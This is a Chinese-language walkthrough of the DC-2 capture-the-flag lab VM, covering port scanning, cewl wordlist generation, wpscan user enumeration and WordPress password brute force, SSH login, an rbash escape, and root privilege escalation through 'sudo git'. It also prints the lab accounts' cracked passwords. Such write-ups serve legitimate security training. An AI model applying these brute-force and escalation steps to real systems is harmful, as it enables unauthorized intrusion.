环境  

  

攻击机：kali（192.168.1.28）

  

靶机：DC-2（192.168.1.10）

  

# 0x01实战

## 端口扫描

```
nmap -sV -A 192.168.1.10 -p-
```

![](../Images/ca63777437d94b5432b3130c66e6dc09.png)

  

可以看到开放了80端口HTTP服务，7744端口SSH服务

  

## flag1

  

访问HTTP服务，在页面发现flag1

![](../Images/dd4fb2d129a109967eadc0865cd83020.png)

  

## flag2

  

flag1提示我们`Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.`那么我们就提示使用cewl来生成字典  

```
cewl dc-2 > password
```

![](../Images/ef1868638f7044b2fe5f980be2e99afb.png)

  

  

有字典就想到爆破，提到爆破就想到后台，对网站进行目录扫描

![](../Images/76f5e8bf9398d7fdb3bd505b6e125f16.png)

  

  

在浏览网站的同时我们也可以发现网站是使用WordPress搭建的

![](../Images/2072c7fb435f0d70e49f8fff5f429eb5.png)

  

  

  

wpscan是专门扫描检测wordpress搭建的工具来查看是否存在已知漏洞，使用wpscan进行扫描

```
wpscan --url dc-2
```

扫描出wordpress的版本，目标IP等信息

![](../Images/0d3b86d7e278291f1aaa0cdd533e228e.png)

  

  

使用wpscan进行用户枚举

```
wpscan --url dc-2 -e u
```

![](../Images/d71b2621dc5b4864f1153b0aad1f7bc5.png)

  

  

成功得到admin、jerry、tom三个账户，创建一个users文件将用户名存入，并使用前面得到的password进行爆破

```
wpscan --url dc-2 -U users -P password
```

![](../Images/0d50fb57e5f12d83f158ced266107687.png)

  

```
`jerry / adipiscingtom / parturient`
```

得到jerry和tom的密码，登录后台，找到flag2

![](../Images/4446ed9e88498387f621ea9e43688b5d.png)

## flag3

  

flag2提示我们`If you can't exploit WordPress and take a shortcut, there is another way.`找另一个突破口，在前面我们扫描出7744端口SSH服务，尝试登录。

```
ssh tom@192.168.1.10 -p 7744
```

成功使用tom账户登录并找到flag3

![](../Images/67baa1f36eee5c540ce48d472f92da54.png)

  

  

查看flag3

![](../Images/8802cfabbf16061d25914caa73f20632.png)

  

  

可以看到使用了rbash(restricted bash，即受限制的 bash。其可以用作中转服务器，或者仅使用 ssh 来访问网页等等)来限制可以使用的命令。尝试绕过rbash

```



BASH_CMDS[a]=/bin/bash
```

再次查看flag3

![](../Images/e21d8c3498b59e624d3b69e1126bc880.png)

  

成功得到flag3

  

## flag4

flag3提示我们`Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.`可怜的老汤姆总是追杰瑞，根据这句话想到flag4可能是在jerry目录里面

![](../Images/74bd1f582e4827b1639d32a35f261d75.png)

  

成功得到flag4

  

## final-flag

通过查看/etc/passwd文件发现jerry用户拥有正常的bash

![](../Images/791fde964ff8496bb9f979775c3caeff.png)

  

  

切换到jerry用户并查看用户权限

![](../Images/ddb93699f2d8b7069a82f0837fb6e28b.png)

  

我们可以无密码以root身份使用git命令，使用git提权

  

输入命令`sudo git help config`之后直接在出现的help界面，输入 `!/bin/bash`，成功提权

![](../Images/2e2975e9f58d9cae5bb657c29ae2b39f.png)

  

成功得到root权限

  

在root根目录找到final-flag

![](../Images/8f8bf61dd043cdeb2a2360d7e5f0a49e.png)
